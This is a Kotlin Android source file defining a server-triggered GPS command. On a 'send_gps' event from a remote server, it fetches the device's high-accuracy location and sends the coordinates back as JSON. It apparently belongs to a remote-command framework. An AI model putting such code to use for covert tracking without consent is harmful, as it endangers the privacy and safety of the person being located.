package com.hc.calling.commands.gps

import android.annotation.SuppressLint
import android.content.Context
import android.location.Location
import android.os.Bundle
import com.google.android.gms.common.ConnectionResult
import com.google.android.gms.common.api.GoogleApiClient
import com.google.android.gms.location.*
import com.google.gson.Gson
import com.hc.calling.commands.Command
import com.hc.calling.commands.Executor
import com.hc.calling.commands.gps.util.GpsDTO
import com.orhanobut.logger.Logger
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking


/**
 * Created by ChanHong on 2019/3/22
 *
 */
class GPS(context: Context) : Command(), Executor {
    var context: Context? = null
    private lateinit var fusedLocationClient: FusedLocationProviderClient

    init {
        this.context = context
    }

    companion object {
        const val SEND_GPS = "send_gps"  //event from server
        const val GPS = "gps" //event to server

        var gpsDTO = GpsDTO("", "")
        @SuppressLint("MissingPermission")
        fun getGPS(context: Context, doWithLocation: (location: Location) -> Unit?) {
            LocationServices.getFusedLocationProviderClient(context)
                .requestLocationUpdates(initLocationRequest(), object : LocationCallback() {
                    override fun onLocationResult(locationResult: LocationResult?) {
                        super.onLocationResult(locationResult)
                        if (locationResult == null) {
                            Logger.e("gps:", "locationResult is null")
                            return
                        }
                        locationResult.locations.forEach {
                            Logger.i("gps:", it.longitude, it.latitude)
                        }

                    }
                }, null)

            val mGoogleApiClient = GoogleApiClient.Builder(context)
                .addConnectionCallbacks(object : GoogleApiClient.ConnectionCallbacks {
                    override fun onConnected(p0: Bundle?) {
                        Logger.e("connection success")
                        //
                        LocationServices.getFusedLocationProviderClient(context).lastLocation.addOnSuccessListener {
                            if (it == null) {
                                return@addOnSuccessListener
                            }
                            gpsDTO.latitude = it.latitude.toString()
                            gpsDTO.longitude = it.longitude.toString()
                            val data = Gson().toJson(gpsDTO)
                            com.orhanobut.logger.Logger.json(data)
                            doWithLocation(it)
                        }

                    }

                    override fun onConnectionSuspended(p0: Int) {
                        Logger.e("connection onConnectionSuspended")

                    }

                })
                .addOnConnectionFailedListener(object : GoogleApiClient.OnConnectionFailedListener {
                    override fun onConnectionFailed(p0: ConnectionResult) {
                        Logger.e("connection failed")
                    }

                })
                .addApi(LocationServices.API)
                .build()
            mGoogleApiClient.connect()

        }

        private fun initLocationRequest(): LocationRequest {
            val locationRequest = LocationRequest.create()
            locationRequest.interval = 60000
            locationRequest.fastestInterval = 5000
            locationRequest.priority = LocationRequest.PRIORITY_HIGH_ACCURACY
            return locationRequest
        }
    }

    override fun execute(data: Array<Any>) {

        GlobalScope.launch(Dispatchers.Main) {
            runBlocking {
                getGPS(context!!) {
                    emitData(GPS, Gson().toJson(gpsDTO))
                    return@getGPS Unit
                }
            }
        }
    }

}